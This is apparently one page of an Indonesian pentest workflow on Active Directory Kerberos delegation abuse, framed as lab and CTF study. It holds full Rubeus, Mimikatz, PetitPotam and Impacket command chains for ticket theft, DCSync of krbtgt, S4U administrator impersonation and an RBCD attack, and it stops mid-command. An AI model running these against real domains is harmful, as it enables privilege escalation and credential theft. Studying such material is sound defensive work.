---
id: "39"
title: "🔐 Workflow 39 — Active Directory Delegation"
category: "4. Active Directory"
categoryId: "ad"
filename: "39_ad_delegation_workflow.md"
refs_out: ["05","14b","37","38","40","41","42","43"]
refs_in: ["11","38","40","41"]
---

# 🔐 Workflow 39 — Active Directory Delegation
## 🛠️ Persiapan Tools

**Impacket** (biasanya sudah ada di Parrot OS)
```bash
pip3 install impacket
# atau
sudo apt install python3-impacket
```

**Cek tools yang tersedia**
```bash
ls /usr/share/doc/python3-impacket/examples/
# atau
pip show impacket
```

**PetitPotam** (install manual)
```bash
git clone https://github.com/ly4k/PetitPotam.git /opt/PetitPotam
```

**DFSCoerce** (install manual)
```bash
git clone https://github.com/ly4k/DFSCoerce.git /opt/DFSCoerce
```
> **Category:** Active Directory Exploitation  
> **Difficulty:** Intermediate → Advanced  
> **Type:** Kerberos / Privilege Escalation / Lateral Movement  
> **Prerequisites:**  
> ← [File 37](/docs/kerberoasting-asreproasting)
> ← [File 38](/docs/ad-acl-abuse)
> **Next:**
> → [File 40](/docs/adcs)
> → [File 41](/docs/ntlm-relay)
> → [File 43](/docs/domain-persistence)

---

## 🎯 0. Fondasi Delegation

### 0.1 🏨 Apa Itu Kerberos Delegation?

Bayangkan sebuah hotel.

Kamu adalah **tamu hotel**.

Resepsionis adalah **service**.

Ada situasi di mana kamu meminta resepsionis melakukan sesuatu atas namamu.

Misalnya:

```text
Kamu
 │
 │ "Tolong ambilkan barang saya
 │  dari ruang penyimpanan."
 ▼
Resepsionis
 │
 ▼
Ruang Penyimpanan
```

Resepsionis tidak mengetahui password atau identitas lengkapmu.

Namun kamu **mempercayakan kemampuan tertentu** kepada resepsionis untuk bertindak atas namamu.

Inilah konsep dasar **delegation**.

Dalam Active Directory:

```text
USER
 │
 │ authentication
 ▼
SERVICE A
 │
 │ bertindak atas nama USER
 ▼
SERVICE B
```

Contoh legitimate:

```text
User
 │
 │ akses aplikasi web
 ▼
Web Server
 │
 │ perlu mengambil data
 │ atas nama user
 ▼
Database Server
```

Tanpa delegation:

```text
USER
 │
 │ credential
 ▼
WEB SERVER
 │
 X tidak boleh begitu saja
 │ menggunakan identitas USER
 ▼
DATABASE
```

Dengan delegation:

```text
USER
 │
 │ authentication
 ▼
WEB SERVER
 │
 │ Kerberos delegation
 │ "bertindak atas nama USER"
 ▼
DATABASE
```

### ⚠️ Mengapa Delegation Dibutuhkan?

Delegation bukan fitur yang dibuat untuk menyerang.

Ia memiliki use case legitimate seperti:

- web server → database
    
- application server → file server
    
- service account → backend service
    
- application tier → database tier
    
- service-to-service authentication
    

Masalahnya muncul ketika **trust yang diberikan terlalu besar** atau objek yang memiliki kemampuan delegation berhasil dikompromikan.

---

### 0.1.1 🔑 Tiga Tipe Delegation

|Tipe|Deskripsi|Risk Level|Attribute / Flag|
|---|---|--:|---|
|**Unconstrained**|Service dapat menerima credential delegation dan berpotensi memperoleh TGT user yang melakukan authentication|🔴 CRITICAL|`TrustedForDelegation` / UAC `0x80000`|
|**Constrained**|Delegation dibatasi ke SPN/service tertentu|🟠 HIGH|`msDS-AllowedToDelegateTo`|
|**RBCD**|Resource target menentukan siapa yang boleh bertindak atas namanya|🟠 HIGH / CRITICAL tergantung target|`msDS-AllowedToActOnBehalfOfOtherIdentity`|

> **Mindset:** Jangan hanya bertanya _"Apakah delegation ada?"_  
> Tanyakan:
> 
> 1. **Siapa yang dipercaya?**
>     
> 2. **Siapa yang bisa mengontrol account/resource tersebut?**
>     
> 3. **Ke service mana delegation berlaku?**
>     
> 4. **Apakah Protocol Transition aktif?**
>     
> 5. **Apakah attacker dapat mengubah konfigurasi delegation?**
>     

---

## 0.2 🧠 Recap Kerberos yang Relevan

Detail Kerberos sudah dibahas pada File 37. Di workflow ini cukup pahami lima konsep:

### TGT — Ticket Granting Ticket

TGT adalah bukti bahwa user sudah berhasil melakukan authentication kepada KDC.

```text
USER
 │
 │ AS-REQ
 ▼
KDC
 │
 │ AS-REP
 ▼
TGT
```

TGT kemudian digunakan untuk meminta TGS.

---

### TGS — Ticket Granting Service Ticket

TGS adalah ticket untuk service tertentu.

```text
TGT
 │
 │ TGS-REQ
 ▼
KDC
 │
 │ TGS-REP
 ▼
TGS untuk SERVICE
```

Contoh:

```text
CIFS/fileserver.domain.local
HTTP/web.domain.local
LDAP/dc.domain.local
HOST/server.domain.local
```

---

### Forwardable TGT

TGT tertentu memiliki flag yang memungkinkan ticket tersebut digunakan dalam mekanisme forwarding/delegation.

Secara konseptual:

```text
TGT
 │
 ├── normal
 │
 └── forwardable
        │
        ▼
     delegation
```

---

### S4U2Self

Sebuah service account dapat meminta service ticket yang mewakili user tertentu tanpa mengetahui password user tersebut.

```text
SERVICE ACCOUNT
      │
      │ S4U2Self
      │ "Saya ingin ticket
      │  untuk USER"
      ▼
     KDC
      │
      ▼
TGS mewakili USER
```

---

### S4U2Proxy

Ticket yang diperoleh kemudian dapat digunakan untuk meminta ticket ke service lain, apabila konfigurasi delegation mengizinkannya.

```text
S4U2Self
   │
   ▼
TGS untuk USER
   │
   │ S4U2Proxy
   ▼
KDC
   │
   ▼
TGS untuk TARGET SERVICE
```

---

### 0.2.1 🔄 Alur Kerberos + Delegation

```text
        USER                 KDC              SERVICE A          SERVICE B
         │                    │                   │                  │
         │── AS-REQ ─────────>│                   │                  │
         │<── TGT ────────────│                   │                  │
         │                    │                   │                  │
         │── TGS-REQ ────────>│                   │                  │
         │<── TGS-A ──────────│                   │                  │
         │                    │                   │                  │
         │────────── authenticate ───────────────>│                  │
         │                    │                   │                  │
         │                    │      delegation   │                  │
         │                    │<──────────────────│                  │
         │                    │                   │                  │
         │                    │── S4U2Proxy ─────>│                  │
         │                    │                   │                  │
         │                    │─────────────────────────────────────>│
         │                    │                   │     access        │
```

### 🧩 Inti yang Harus Diingat

```text
TGT
 │
 ├── identitas user
 │
 ├── forwardable?
 │
 └── dapat terlibat dalam delegation

S4U2Self
 │
 └── service → ticket atas nama user

S4U2Proxy
 │
 └── service → ticket user → service lain
```

---

## 0.3 💀 Kenapa Delegation Dangerous di Pentest?

Delegation mengubah batas trust.

Tanpa delegation:

```text
USER A
  │
  X
  │
SERVICE B
```

Dengan delegation:

```text
USER A
  │
  ▼
SERVICE A
  │
  │ bertindak sebagai USER A
  ▼
SERVICE B
```

Jika `SERVICE A` berhasil dikompromikan:

```text
ATTACKER
   │
   ▼
COMPROMISED SERVICE
   │
   └── delegation capability
             │
             ▼
       impersonation
```

### Perbandingan

|Delegation|Prerequisite Umum|Dampak|
|---|---|---|
|Unconstrained|Compromise komputer/service yang trusted for delegation|Dapat memperoleh TGT dari authentication yang masuk|
|Constrained + Protocol Transition|Credential/hash service account + delegation ke target|Impersonation user ke service yang diizinkan|
|Constrained tanpa Protocol Transition|Credential service + TGS user yang sesuai|Forward ticket user ke target|
|RBCD|Kontrol computer account + write permission terhadap target computer object|Membuat principal attacker dapat melakukan delegation ke target|

> **Poin penting:** Delegation tidak otomatis berarti Domain Admin. Dampaknya bergantung pada **siapa yang dapat diimpersonate**, **service target**, dan **hak account yang diimpersonate**.

---

# 🔴 1. Unconstrained Delegation

## 1.1 🧠 Konsep Unconstrained Delegation

Pada unconstrained delegation, service/computer dipercaya untuk melakukan delegation tanpa pembatasan target service seperti pada constrained delegation.

Secara konseptual:

```text
USER
 │
 │ Kerberos authentication
 ▼
UNCONSTRAINED SERVICE
 │
 │ TGT user tersedia
 ▼
SERVICE / MEMORY
```

Jika attacker mendapatkan kontrol atas komputer tersebut, ticket yang masuk dapat menjadi target.

### Mengapa CRITICAL?

Bayangkan:

```text
ADMIN
 │
 │ authenticate
 ▼
UNCONSTRAINED COMPUTER
 │
 │ TGT Admin tersedia
 ▼
ATTACKER
```

Jika account yang authenticate adalah privileged:

```text
Administrator
      │
      ▼
Unconstrained Computer
      │
      ▼
TGT Administrator
      │
      ▼
Privilege escalation
```

---

## 1.2 🔎 Enumeration Unconstrained Delegation

### PowerView

```powershell
# Cari computer dengan unconstrained delegation
Get-DomainComputer -Unconstrained |
    Select-Object Name,dnshostname,useraccountcontrol

# Exclude Domain Controllers
Get-DomainComputer -Unconstrained |
    Where-Object {
        $_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT"
    } |
    Select-Object Name,dnshostname
```

### Contoh Output

```text
Name       dnshostname                  useraccountcontrol
----       -----------                  ------------------
FILE01     file01.domain.local          TRUSTED_FOR_DELEGATION
APPSRV01   appsrv01.domain.local        TRUSTED_FOR_DELEGATION
```

---

### Cari Account yang Diizinkan Delegation

```powershell
# Cari user yang memiliki delegation-related configuration
Get-DomainUser -AllowDelegation |
    Select-Object samaccountname,useraccountcontrol
```

> Jangan menganggap setiap hasil `AllowDelegation` identik dengan unconstrained delegation. Selalu lihat attribute/flag yang sebenarnya.

---

## 1.2.1 🐧 Enumeration dengan Impacket

```bash
# Simpan variabel target
DC_IP="10.10.10.10"
DOMAIN="domain.local"
USERNAME="username"
PASSWORD="password"

# Enumerate delegation configuration
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Contoh output:

```text
AccountName      AccountType  DelegationType      DelegationRightsTo
--------------   -----------  ------------------  -------------------------
DC01$            Computer     Unconstrained       -
FILE01$          Computer     Unconstrained       -
svc-web          User         Constrained          HTTP/web01.domain.local
```

---

## 1.2.2 🔍 LDAP Enumeration

```bash
# LDAP query untuk computer Trusted for Delegation
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "DC=domain,DC=local" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
    dn userAccountControl
```

`524288` = `0x80000`, flag `TRUSTED_FOR_DELEGATION`.

Contoh:

```text
dn: CN=FILE01,CN=Computers,DC=domain,DC=local
userAccountControl: 524800
```

---

## 1.2.3 🩸 BloodHound

Conceptually cari:

```text
Computer
   │
   └── unconstraineddelegation = true
```

Contoh Cypher:

```cypher
// Cari computer dengan unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name,c.operatingsystem
```

Exclude DC bila ingin fokus pada computer non-DC:

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name ENDS WITH 'DC'
RETURN c.name,c.operatingsystem
```

### Output

```text
FILE01.DOMAIN.LOCAL
APPSRV01.DOMAIN.LOCAL
```

---

# 1.3 💥 Exploitation Unconstrained Delegation

> **Lab assumption:** komputer delegation sudah berhasil dikompromikan dan kamu memiliki privilege yang diperlukan untuk mengakses ticket material.

Attack path:

```text
ATTACKER
   │
   ▼
Compromise Unconstrained Computer
   │
   ▼
Monitor Kerberos tickets
   │
   ▼
Privileged user/DC authenticates
   │
   ▼
TGT muncul
   │
   ▼
Export / use ticket
   │
   ▼
Privilege escalation / lateral movement
```

---

## 1.3.1 👀 Step 1 — Monitor Ticket dengan Rubeus

Di Windows:

```powershell
# Monitor ticket yang masuk setiap 5 detik
.\Rubeus.exe monitor /interval:5 /nowrap
```

Penjelasan:

```text
/monitor      → monitor logon sessions/tickets
/interval:5   → polling setiap 5 detik
/nowrap       → output ticket tidak di-wrap
```

Contoh output:

```text
[*] Monitoring for new TGTs every 5 seconds...

[*] 09/08/2026 13:25:10
UserName              : administrator
ServiceName            : krbtgt
Domain                 : DOMAIN.LOCAL
Base64(ticket.kirbi)   : doIF...
```

---

## 1.3.2 🎯 Step 2 — Coerce Authentication

Konsep:

```text
DC
 │
 │ forced authentication
 ▼
UNCONSTRAINED COMPUTER
 │
 ▼
TGT masuk
```

Teknik coercion dibahas lebih detail di Bagian 4.

Contoh lab:

```bash
# Target DC
DC_IP="10.10.10.10"

# Komputer unconstrained
TARGET="10.10.10.20"

# Trigger authentication pada lab environment
python3 /opt/PetitPotam/PetitPotam.py \
    "$TARGET" \
    "$DC_IP"
```

> Nama/argumen tool coercion berbeda antar versi. Gunakan `-h` jika syntax pada build lokal berbeda.

---

## 1.3.3 🎫 Step 3 — Dump Ticket

Di komputer Windows yang memiliki ticket:

```powershell
# Dump ticket Kerberos yang tersedia
.\Rubeus.exe dump /nowrap
```

Contoh:

```text
[*] Current LUID    : 0x3e7
[*] ServiceName     : krbtgt
[*] UserName        : DC01$
[*] Domain           : DOMAIN.LOCAL
[*] StartTime        : 09/08/2026 13:25:12
[*] EndTime          : 09/08/2026 23:25:12
[*] RenewTill        : 09/15/2026 13:25:12
```

Jika menggunakan Mimikatz:

```powershell
# Export Kerberos tickets
sekurlsa::tickets /export
```

Contoh:

```text
[00000000] - 0x00000017 - aes256_hmac
  Server Name : krbtgt/DOMAIN.LOCAL
  User Name   : DC01$
```

---

## 1.3.4 🎟️ Step 4 — Pass-the-Ticket

Dengan Rubeus:

```powershell
# Inject ticket ke logon session
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Tampilkan ticket setelah injection
klist
```

Contoh:

```text
Cached Tickets: (1)

#0>     Client: DC01$ @ DOMAIN.LOCAL
        Server: krbtgt/DOMAIN.LOCAL @ DOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
```

### Kenapa Ini Berbahaya?

Karena attacker sekarang tidak lagi hanya memiliki:

```text
password
```

tetapi memiliki:

```text
Kerberos authentication material
```

yang dapat digunakan sesuai privilege dan batas ticket tersebut.

---

## 1.3.5 🧬 DCSync

> DCSync membutuhkan replication privileges. Memiliki ticket saja tidak secara otomatis berarti DCSync selalu berhasil.

Jika ticket berasal dari principal DC/machine account yang memang memiliki hak replication dalam lab, contoh aksi yang bisa dilakukan:
- Akses share administratif `C$` pada DC untuk menyalin file sensitif.
- Dump credential dari DC menggunakan `secretsdump.py` atau `Mimikatz` (`lsadump::dcsync`).
- Jalankan perintah `dir \\DC01\c$` atau `net view \\DC01` untuk enumerasi lebih lanjut.

```powershell
# Jalankan Mimikatz
mimikatz.exe

# Request credential material dari directory replication
lsadump::dcsync /domain:domain.local /user:krbtgt
```

Contoh:

```text
[DC] 'DOMAIN.LOCAL' will be queried
[DC] 'DC01.DOMAIN.LOCAL' will be contacted

Object RDN           : krbtgt

Hash NTLM:
9d765b482771505cbe97411065f6a9ed
```

---

# 1.4 🐧 Menggunakan Ticket dari Parrot OS

Ticket `.kirbi` perlu digunakan dalam format yang sesuai dengan tool Linux.

```bash
# Konversi ticket bila diperlukan
# Alternatif 1 – gunakan ticket langsung (base64) dari Rubeus
# contoh: export KRB5CCNAME=$(mktemp) && echo "$BASE64_TICKET" | base64 -d > $KRB5CCNAME

# Alternatif 2 – gunakan ticketConverter jika tersedia
#   impacket-ticketConverter ticket.kirbi ticket.ccache

# Alternatif 3 – gunakan script impacket-ticketConverter (wrapper)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set Kerberos cache
export KRB5CCNAME="$PWD/ticket.ccache"

# Verifikasi cache
klist
```

Contoh:

```text
Credentials cache: FILE:ticket.ccache
Principal: DC01$@DOMAIN.LOCAL

Valid starting       Expires              Service principal
09/08/2026 13:25     09/08/2026 23:25     krbtgt/DOMAIN.LOCAL
```

Jika principal memiliki replication privileges:

```bash
# Gunakan Kerberos authentication
python3 /opt/impacket/examples/secretsdump.py \
    -k \
    -no-pass \
    -dc-ip "$DC_IP" \
    "$DOMAIN/DC01\$@DC01.$DOMAIN"
```

> Gunakan nama host/SPN yang benar sesuai environment. Jangan menganggap `DC01$` otomatis mempunyai hak DCSync hanya karena ia adalah machine account.

---

# 🟠 2. Constrained Delegation

## 2.1 🧠 Konsep

Constrained delegation memperbaiki masalah utama unconstrained delegation:

```text
UNCONSTRAINED

SERVICE
  │
  ├── Service A
  ├── Service B
  ├── Service C
  └── Service D
```

Constrained:

```text
SERVICE
  │
  └── hanya boleh delegate ke:
          │
          ├── CIFS/fileserver
          └── HTTP/webserver
```

Attribute utama:

```text
msDS-AllowedToDelegateTo
```

Contoh:

```text
svc-web
   │
   └── msDS-AllowedToDelegateTo
          │
          ├── HTTP/web01.domain.local
          └── CIFS/files01.domain.local
```

---

## 2.1.1 🔀 Dua Mode Penting

### With Protocol Transition

Account/service memiliki:

```text
TRUSTED_TO_AUTH_FOR_DELEGATION
```

Sehingga mekanisme S4U dapat digunakan untuk memperoleh ticket atas nama user tanpa user memberikan password secara langsung kepada service.

```text
SERVICE ACCOUNT
      │
      │ S4U2Self
      ▼
TGS sebagai USER
      │
      │ S4U2Proxy
      ▼
TARGET SERVICE
```

### Kerberos Only / Without Protocol Transition

Service tidak memiliki protocol transition.

Biasanya membutuhkan authentication Kerberos dari user terlebih dahulu agar ticket dapat diteruskan sesuai konfigurasi.

```text
USER
 │
 │ real Kerberos authentication
 ▼
SERVICE
 │
 │ S4U2Proxy
 ▼
TARGET
```

|Mode|Credentials User Target|Mekanisme|Risk|
|---|---|---|---|
|Protocol Transition|Tidak perlu password user target|S4U2Self + S4U2Proxy|🔴 Critical|
|Kerberos Only|Memerlukan ticket/authentication user yang sesuai|S4U2Proxy|🟠 High|

---

# 2.2 🔎 Enumeration Constrained Delegation

## PowerView

```powershell
# Cari user dengan TrustedToAuthForDelegation
Get-DomainUser -TrustedToAuth |
    Select-Object samaccountname,
                  useraccountcontrol,
                  msds-allowedtodelegateTo
```

Computer:

```powershell
# Cari computer dengan constrained delegation
Get-DomainComputer -TrustedToAuth |
    Select-Object Name,
                  dnshostname,
                  useraccountcontrol,
                  msds-allowedtodelegateto
```

Format readable:

```powershell
# Tampilkan satu delegation target per baris
Get-DomainUser -TrustedToAuth | ForEach-Object {

    $Account = $_.samaccountname

    $_.msds-allowedtodelegateto | ForEach-Object {

        [PSCustomObject]@{
            Account     = $Account
            DelegatesTo = $_
        }
    }
}
```

---

## 2.2.1 🐧 Impacket

```bash
# Enumerate delegation configuration
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Contoh:

```text
AccountName    AccountType  DelegationType             DelegationRightsTo
-----------    -----------  --------------------------  -----------------------------
svc-web        User         Constrained w/ Protocol    HTTP/web01.domain.local
WEB01$         Computer     Constrained                CIFS/files01.domain.local
```

---

## 2.2.2 🩸 BloodHound

```cypher
// Cari edge delegation
MATCH (u)-[r:AllowedToDelegate]->(target)
RETURN u.name,target.name
```

Contoh:

```text
SVC-WEB@DOMAIN.LOCAL
        │
        └── AllowedToDelegate
                    │
                    ▼
             CIFS/FILE01
```

Untuk analisis privilege path:

```cypher
// Cari delegation principal yang dapat mencapai computer target
MATCH p=(u)-[:AllowedToDelegate]->(c:Computer)
RETURN p
```

---

# 2.3 💥 Exploitation Constrained Delegation

## Prerequisite

Contoh lab:

```text
DOMAIN       = domain.local
ACCOUNT      = svc-web
PASSWORD     = Password123!
TARGET       = fileserver.domain.local
SPN          = CIFS/fileserver.domain.local
USER         = administrator
```

Attack path:

```text
svc-web credential/hash
        │
        ▼
       TGT
        │
        ▼
    S4U2Self
        │
        ▼
TGS sebagai Administrator
        │
        ▼
    S4U2Proxy
        │
        ▼
CIFS/fileserver
        │
        ▼
Access sebagai Administrator
```

---

## 2.3.1 🪪 Rubeus — Password

```powershell
# Account yang memiliki constrained delegation
$USERNAME="svc-web"

# Password service account
$PASSWORD="Password123!"

# User yang ingin diimpersonate
$IMPERSONATE="administrator"

# SPN target
$SPN="CIFS/fileserver.domain.local"

# S4U2Self + S4U2Proxy
.\Rubeus.exe s4u `
    /user:$USERNAME `
    /password:$PASSWORD `
    /impersonateuser:$IMPERSONATE `
    /msdsspn:$SPN `
    /ptt
```

Penjelasan:

```text
/user            → service account
/password        → credential service account
/impersonateuser → user yang direpresentasikan
/msdsspn         → SPN target
/ptt             → langsung inject ticket
```

Verifikasi:

```powershell
# Lihat ticket Kerberos
klist
```

Contoh:

```text
Client: administrator @ DOMAIN.LOCAL
Server: CIFS/fileserver.domain.local @ DOMAIN.LOCAL
```

---

## 2.3.2 🔑 Rubeus — NTLM Hash

Jika memiliki hash account:

```powershell
# Gunakan NTLM hash sebagai credential
.\Rubeus.exe s4u `
    /user:$USERNAME `
    /rc4:NTLM_HASH `
    /impersonateuser:$IMPERSONATE `
    /msdsspn:$SPN `
    /ptt
```

> Hash yang digunakan harus benar-benar merupakan key yang dapat digunakan untuk authentication Kerberos pada environment tersebut.

---

## 2.3.3 🐧 Impacket — Dapatkan TGT

```bash
# Account constrained delegation
USERNAME="svc-web"

# Password
PASSWORD="Password123!"

# Domain
DOMAIN="domain.local"

# DC
DC_IP="10.10.10.10"

# Request TGT
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Output:

```text
[*] Saving ticket in svc-web.ccache
```

---

## 2.3.4 🎟️ Impacket — S4U2Self + S4U2Proxy

```bash
# Gunakan TGT service account
export KRB5CCNAME="svc-web.ccache"

# Target SPN
SPN="CIFS/fileserver.domain.local"

# User yang diimpersonate
IMPERSONATE="administrator"

# Request service ticket melalui S4U
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$USERNAME" \
    -k \
    -no-pass \
    -spn "$SPN" \
    -impersonate "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

Contoh output:

```text
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

---

## 2.3.5 🗂️ Gunakan Ticket

```bash
# Gunakan ticket administrator
export KRB5CCNAME="administrator.ccache"

# Akses SMB dengan Kerberos
python3 /opt/impacket/examples/smbclient.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@fileserver.domain.local"
```

Jika target memang memberikan administrative access:

```bash
# Remote execution menggunakan Kerberos
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@fileserver.domain.local"
```

---

# 2.4 🔄 SPN Substitution

Kadang target delegation memiliki SPN tertentu:

```text
HTTP/fileserver.domain.local
```

tetapi service yang ingin diakses:

```text
CIFS/fileserver.domain.local
```

Konsep yang perlu dipahami:

```text
HOSTNAME tetap sama
       │
       ▼
fileserver.domain.local

Service name berubah:
HTTP
 │
 ├── CIFS
 ├── HOST
 └── lainnya
```

Dalam kondisi tertentu, SPN substitution dapat berhasil karena Windows memiliki pemetaan service class tertentu.

Contoh pengujian di lab:

```bash
# Coba service class HOST pada host yang sama
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$USERNAME" \
    -k \
    -no-pass \
    -spn "HOST/fileserver.domain.local" \
    -impersonate "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

> **Jangan menganggap substitution selalu berhasil.** Validasi target SPN, service mapping, delegation ACL, dan behavior KDC pada environment tersebut.

---

# 🟣 3. Resource-Based Constrained Delegation — RBCD

## 3.1 🧠 Konsep RBCD

RBCD adalah bagian yang sangat penting untuk CTF modern.

Perbedaan utamanya:

### Traditional Constrained Delegation

Konfigurasi berada pada **delegating account**:

```text
SERVICE ACCOUNT
      │
      │ msDS-AllowedToDelegateTo
      ▼
TARGET SERVICE
```

### RBCD

Konfigurasi berada pada **resource/target**:

```text
TARGET COMPUTER
      │
      │ msDS-AllowedToActOnBehalfOfOtherIdentity
      ▼
FAKE COMPUTER
```

Sehingga:

```text
TARGET COMPUTER
      │
      └── "FAKECOMPUTER$ boleh bertindak
           atas nama user kepada saya"
```

Inilah alasan RBCD sangat menarik bagi attacker.

---

# 3.2 🔑 Attribute RBCD

Attribute:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

berada pada **target computer object**.

Contoh:

```text
TARGETCOMPUTER$
      │
      └── msDS-AllowedToActOnBehalfOfOtherIdentity
                   │
                   ▼
             FAKECOMPUTER$
```

Jika attacker memiliki hak yang memungkinkan perubahan attribute tersebut:

```text
LOW PRIV USER
      │
      │ GenericWrite / WriteDACL / GenericAll
      ▼
TARGET COMPUTER OBJECT
      │
      │ write RBCD
      ▼
FAKECOMPUTER$
      │
      ▼
S4U2Self
      │
      ▼
S4U2Proxy
      │
      ▼
TARGET COMPUTER
```

---

# 3.3 ⚙️ Prerequisite RBCD

Biasanya attack chain membutuhkan:

### 1. Computer account yang dikontrol attacker

Bisa berupa:

```text
existing computer account
```

atau computer account baru jika:

```text
MachineAccountQuota > 0
```

### 2. Write capability terhadap target computer object

Contoh:

```text
GenericWrite
WriteDACL
GenericAll
```

### 3. Target computer yang memiliki service/SPN yang dapat digunakan

Contoh:

```text
CIFS/TARGET.domain.local
HOST/TARGET.domain.local
```

---

## 3.3.1 📊 MachineAccountQuota

MachineAccountQuota menentukan jumlah computer account yang dapat dibuat oleh principal non-privileged melalui mekanisme yang sesuai.

Default AD environment secara historis sering:

```text
MachineAccountQuota = 10
```

Tetapi **jangan mengasumsikan default**.

Selalu enumerate.

---

# 3.4 🔎 Check MachineAccountQuota

## PowerView

```powershell
# Ambil domain object
Get-DomainObject -Identity "DC=domain,DC=local" |
    Select-Object ms-ds-machineaccountquota
```

Contoh:

```text
ms-ds-machineaccountquota
-------------------------
10
```

---

## LDAP

```bash
# Query domain object
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "DC=domain,DC=local" \
    "(objectClass=domain)" \
    ms-DS-MachineAccountQuota
```

Output:

```text
dn: DC=domain,DC=local
ms-DS-MachineAccountQuota: 10
```

### Decision

```text
MachineAccountQuota?
       │
       ├── > 0
       │     │
       │     └── candidate:
       │         create computer
       │
       └── 0
             │
             └── cari existing computer account
```

---

# 3.5 💥 RBCD Full Attack Chain

## Attack Map

```text
                    ┌───────────────────┐
                    │   LOW PRIV USER   │
                    └─────────┬─────────┘
                              │
                              │ GenericWrite
                              ▼
                    ┌───────────────────┐
                    │ TARGETCOMPUTER$   │
                    └─────────┬─────────┘
                              │
                              │ RBCD write
                              ▼
                    ┌───────────────────┐
                    │ FAKECOMPUTER$     │
                    └─────────┬─────────┘
                              │
                              │ TGT
                              ▼
                         S4U2Self
                              │
                              ▼
                      User = Administrator
                              │
                              ▼
                         S4U2Proxy
                              │
                              ▼
                    CIFS/TARGETCOMPUTER
                              │
                              ▼
                      Administrator access
```

---

# 3.5.1 🖥️ Step 1 — Create Fake Computer

Dari Parrot OS:

```bash
# Domain
DOMAIN="domain.local"

# Low privilege account
USERNAME="lowprivuser"

# Password
PASSWORD="Password123!"

# DC
DC_IP="10.10.10.10"

# Fake computer name
FAKECOMPUTER="FAKECOMPUTER$"

# Password fake computer
FAKEPASS="FakePass123!"

# Buat machine account
python3 /opt/impacket/examples/addcomputer.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -method LDAPS \
    -computer-name "$FAKECOMPUTER" \
    -computer-pass "$FAKEPASS" \
    -dc-ip "$DC_IP"
```

Contoh output:

```text
[*] Successfully added machine account FAKECOMPUTER$
```

---

## 3.5.2 🔎 Verifikasi Computer Account

```bash
# Alternatif 1 – pakai ldapsearch (selalu ada)
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=$DOMAIN,DC=local" \
  "(sAMAccountName=FAKECOMPUTER$)" \
  sAMAccountName

# Alternatif 2 – pakai GetADUsers (umum ada)
python3 /opt/impacket/examples/GetADUsers.py \
  -all "$DOMAIN/$USERNAME:$PASSWORD" \
  -dc-ip "$DC_IP" | grep -i "FAKECOMPUTER"
```

Contoh:

```text
FAKECOMPUTER$    10.10.10.50
```

> Nama tool enumeration dapat berbeda antar versi Impacket. Bila `GetADComputers.py` tidak tersedia, gunakan LDAP atau tool enumeration yang tersedia pada versi lokal.

---

# 3.5.3 📝 Step 2 — Set RBCD Attribute

Target:

```bash
TARGET="TARGETCOMPUTER$"
```

Gunakan `rbcd.py`:

```bash
# Set FAKECOMPUTER$ sebagai principal yang dipercaya
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action write \
    -delegate-to "$TARGET" \
    -delegate-from "$FAKECOMPUTER" \
    -dc-ip "$DC_IP"
```

Contoh:

```text
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity
[*] updated successfully
```

### Kenapa Ini Bisa Work?

Sebelumnya:

```text
TARGETCOMPUTER
    │
    └── tidak mempercayai FAKECOMPUTER
```

Setelah perubahan:

```text
TARGETCOMPUTER
    │
    └── trusts FAKECOMPUTER$
             │
             └── delegation allowed
```

Attacker tidak perlu menjadikan `FAKECOMPUTER$` sebagai Administrator.

Attacker hanya membuatnya menjadi **delegating principal yang dipercaya oleh target**.

---

# 3.5.4 🔍 Step 2b — Verify RBCD

```bash
# Baca RBCD configuration
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action read \
    -delegate-to "$TARGET" \
    -dc-ip "$DC_IP"
```

Contoh:

```text
[*] Principals allowed to act on behalf of users:
[*]     FAKECOMPUTER$
```

---

# 3.5.5 🎫 Step 3 — Dapatkan TGT Fake Computer

Password-based:

```bash
# Request TGT untuk fake computer account
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$FAKECOMPUTER:$FAKEPASS" \
    -dc-ip "$DC_IP"
```

Contoh:

```text
[*] Saving ticket in FAKECOMPUTER$.ccache
```

Set cache:

```bash
# Gunakan TGT fake computer
export KRB5CCNAME="FAKECOMPUTER\$.ccache"

# Verifikasi
klist
```

---

# 3.5.6 🎭 Step 4 — S4U2Self + S4U2Proxy

```bash
# User yang ingin diimpersonate
IMPERSONATE="administrator"

# SPN target
SPN="CIFS/targetcomputer.domain.local"

# Request service ticket melalui RBCD
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$FAKECOMPUTER" \
    -k \
    -no-pass \
    -spn "$SPN" \
